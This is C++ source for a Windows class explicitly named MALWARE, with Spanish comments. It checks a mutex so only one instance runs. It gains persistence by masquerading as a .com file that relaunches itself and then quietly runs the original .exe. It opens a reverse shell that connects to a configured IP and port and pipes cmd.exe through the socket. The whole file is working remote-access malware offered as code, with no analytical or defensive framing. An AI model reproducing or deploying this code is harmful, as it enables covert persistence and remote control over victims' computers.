#include "malware.h"
#include <wchar.h>
//http://www.cplusplus.com/doc/tutorial/classes/



MALWARE::MALWARE(char* ip, char* port, char* mutexe) {
	_ip = ip;
	_port = port;
	_mutexe = mutexe;
}

BOOL MALWARE::check_mutexe() {
	HANDLE Hmutex = OpenMutexA(MUTEX_ALL_ACCESS, FALSE, _mutexe);
	if (Hmutex != NULL) 
		return TRUE;
	else {
		Hmutex = CreateMutexA(NULL, NULL, _mutexe);
		return FALSE;
	}
}

void MALWARE::check_path_persistence() {
	wchar_t wfile_name[MY_MAX_PATH];
	char cfile_name[MY_MAX_PATH];

	if ( GetModuleFileName(NULL, wfile_name, MY_MAX_PATH) != 0 && GetModuleFileNameA(NULL, cfile_name, MY_MAX_PATH) != 0) { // Si cogemos el nombre sin problemas y tenemos que chequear
		wchar_t* com = L".com";
		wchar_t* pos = wcsstr(wfile_name,com);
		if (pos != NULL) { //Si encontramos .com en el nombre
			PROCESS_INFORMATION pi1, pi2; ZeroMemory(&pi1, sizeof(PROCESS_INFORMATION)); ZeroMemory(&pi2, sizeof(PROCESS_INFORMATION));
			STARTUPINFO sui1; ZeroMemory(&sui1, sizeof(STARTUPINFO));
			STARTUPINFOA sui2;  ZeroMemory(&sui2, sizeof(STARTUPINFOA));
			//creamos nuestro proceso pasandole un parametro
			char my_porc[MY_MAX_PATH];
			strcpy_s(my_porc, MY_MAX_PATH, cfile_name);
			strcat_s(my_porc, MY_MAX_PATH, " ");
			strcat_s(my_porc, MY_MAX_PATH, PATH_KEY);
			CreateProcessA(NULL, my_porc, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sui2, &pi2);

			//Ejecutamos el porgama que queria ejecutar el usuario
			wchar_t* exe = L".exe";
			wcscpy_s(pos, MY_MAX_PATH, exe); //Cambiamos el .com por .exe
			CreateProcess(wfile_name, NULL, NULL, NULL, FALSE, CREATE_NEW_CONSOLE, NULL, NULL, &sui1, &pi1); //Ejecutamos el .exe original en otra consola TODO PASARLE LOS PARAMATROS QUE LE DEN
		
			exit(EXIT_SUCCESS); //Ya hemos ejecutado ambos programas, este proceso ya muere
		}
	}
}

void MALWARE::get_console() {

	if (ConSocket(_ip, _port) != 0) return ;
	CreatePipes();

	// Create the child process (cmd.exe). 
	if (CreateChildProcess() != 0) return;

	DWORD myThreadID1, myThreadID2, myThreadIDCommand;
	HANDLE hThread1 = CreateThread(NULL, NULL, FromSocketToPipe, NULL, NULL, &myThreadID1);
	HANDLE hThread2 = CreateThread(NULL, NULL, FromPipeToSocket, NULL, NULL, &myThreadID2);
	HANDLE hThreadCommands = CreateThread(NULL, NULL, FromPipeCommandsToSocket, NULL, NULL, &myThreadIDCommand);

	MyWaitForSingleObject();

}